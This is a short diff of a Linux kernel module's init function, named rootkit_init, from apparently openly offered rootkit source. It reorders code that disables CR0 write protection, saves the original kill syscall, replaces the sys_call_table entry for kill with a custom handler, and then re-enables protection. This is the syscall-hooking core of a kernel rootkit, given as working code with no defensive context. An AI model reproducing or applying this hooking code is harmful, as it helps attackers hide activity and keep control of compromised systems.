@@ -45,8 +45,9 @@ static int __init rootkit_init(void) {
 		return -1;
 	}
 	
-	write_cr0(read_cr0() & ~0x00010000); // clear WP
 	ref_sys_kill = (void *) sys_call_table[__NR_kill];
+	
+	write_cr0(read_cr0() & ~0x00010000); // clear WP
 	sys_call_table[__NR_kill] = (unsigned long *) new_sys_kill; // replace
 	write_cr0(read_cr0() | 0x00010000); // set WP
 
